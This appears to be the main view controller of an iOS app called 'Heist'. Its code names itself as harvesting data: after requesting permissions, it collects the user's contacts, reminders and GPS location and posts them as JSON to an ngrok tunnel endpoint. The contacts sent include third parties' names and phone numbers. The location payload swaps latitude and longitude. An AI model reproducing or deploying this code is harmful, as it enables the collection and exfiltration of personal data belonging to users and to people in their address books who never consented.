//
//  ViewController.swift
//  Heist
//
//  Created by Shrawan Sah on 08/04/21.
//

import UIKit
import CoreLocation
import EventKit

struct heistedData {
    var Contacts: [FetchedContact]
    var Location: [CLLocationDegrees?]? // not reliable cause of location change trigger
    var Reminders: [EKReminder]
}
var userData = heistedData(Contacts: [], Reminders: [EKReminder]())

class ViewController: UIViewController, CLLocationManagerDelegate {
    
    // UI elements
    @IBOutlet weak var startHeistButton: UIButton!
    @IBOutlet weak var userIdInput: UITextField!
    
    // private vars
    private var appPermissions = AppPermissions()
    private var isLocationUpdated = false
    private var userID = ""

    override func viewDidLoad() {
        super.viewDidLoad()
        
        appPermissions.askLocationPermission()
        appPermissions.askContactsPermissions()
        appPermissions.askEventsPermissions()
    }

    @IBAction func startButtonPressed(_ sender: UIButton) {
        self.userID = userIdInput.text ?? ""
        
        // location
        self.heistLocation()
        
        // contacts
        self.heistContacts()
        
        // reminders
        self.heistReminders()
        
        let jsonTodo: Data
        do {
            var postData: [String: Any] = [:]
            postData["contacts"] = parseContacts()
            postData["reminders"] = userData.Reminders
            postData["device_type"] = "ios_app"
            postData["user_id"] = self.userID
            postData["is_api"] = true;
            
            jsonTodo = try JSONSerialization.data(withJSONObject: postData, options: [])
        } catch {
            print("Error: cannot create JSON from postData")
            return
        }
        saveUserData(jsonTodo: jsonTodo)
    }
    
    private func parseContacts() -> [String: Any] {
        var contacts: [String: Any] = [:]
        for contact in userData.Contacts {
            let phone: String
            phone = contact.telephone ?? ""
            
            if phone == "" {
                continue
            }
            print(phone)
            contacts[phone] = [
                "first_name" : contact.firstName,
                "last_name" : contact.lastName
            ]
            
        }
        
        return contacts
    }
    
    private func heistReminders() {
        if !appPermissions.canAccessUserEvents() {
            showPermissionBlockedUI(title: "Events permission is disabled", message: "Please enable events Services in your Settings")
            return
        }
        
        userData.Reminders = appPermissions.getUserReminders()
    }
    
    private func heistLocation() {
        if !appPermissions.canAccessUserLocation() {
            showPermissionBlockedUI(title: "Location permission is disabled", message: "Please enable Location Services in your Settings")
            return
        }
        
        appPermissions.getLocationManager().delegate = self
        appPermissions.getLocationManager().startUpdatingLocation()
    }
    
    private func heistContacts() {
        if !appPermissions.canAccessUserContacts() {
            showPermissionBlockedUI(title: "Contacts permission is disabled", message: "Please enable contacts Services in your Settings")
            return
        }
        
        userData.Contacts = appPermissions.getContacts()
    }
    
    private func showPermissionBlockedUI(title: String, message: String) {
        let alert = UIAlertController(title: title, message: message, preferredStyle: .alert)
        let okAction = UIAlertAction(title: "OK", style: .default, handler: nil)
        
        alert.addAction(okAction)
        present(alert, animated: true, completion: nil)
    }
    
    
    // location manager deligates
    func locationManager(_ manager: CLLocationManager, didUpdateLocations locations: [CLLocation]){
        
        // this mrthod is triggered async, should make a separate api call
        let location = locations.last
        appPermissions.getLocationManager().stopUpdatingLocation()
        userData.Location = [location?.coordinate.latitude, location?.coordinate.longitude]
        
        let jsonTodo: Data
        var postData: [String: Any] = [:]
        
        do {
            postData["location"] = [
                "longitude" : location?.coordinate.latitude,
                "latitude" : location?.coordinate.longitude
            ]
            postData["device_type"] = "ios_app"
            postData["user_id"] = self.userID
            postData["is_api"] = true;
            
            jsonTodo = try JSONSerialization.data(withJSONObject: postData, options: [])
        } catch {
          print("Error: cannot create JSON from location postData")
          return
        }
        saveUserData(jsonTodo: jsonTodo)
    }
    func locationManager(_ manager: CLLocationManager, didFailWithError error: Error){
        print("Errors: " + error.localizedDescription)
    }
    
    func printUserData() {
        print(userData)
    }
    
    func saveUserData(jsonTodo: Data) {
        let todosEndpoint: String = "https://f0cfc4a67070.ngrok.io/insertPermissions.php"
        guard let todosURL = URL(string: todosEndpoint) else {
          print("Error: cannot create URL")
          return
        }
        var todosUrlRequest = URLRequest(url: todosURL)
        todosUrlRequest.httpMethod = "POST"
        todosUrlRequest.httpBody = jsonTodo

        let session = URLSession.shared

        let task = session.dataTask(with: todosUrlRequest) {
          (data, response, error) in
          guard error == nil else {
            print("error calling POST on /todos/1")
            print(error as Any)
            return
          }
          guard let responseData = data else {
            print("Error: did not receive data")
            return
          }
          
          // parse the result as JSON, since that's what the API provides
          do {
            guard let receivedTodo = try JSONSerialization.jsonObject(with: responseData,
              options: []) as? [String: Any] else {
                print("Could not get JSON from responseData as dictionary")
                return
            }
            print("The response todo is: " + receivedTodo.description)
            
            guard let todoID = receivedTodo["id"] as? Int else {
              print("Could not get todoID as int from JSON")
              return
            }
            print("The ID is: \(todoID)")
          } catch  {
            print("error parsing response from POST on /todos")
            return
          }
        }
        task.resume()
    }
    
    
}

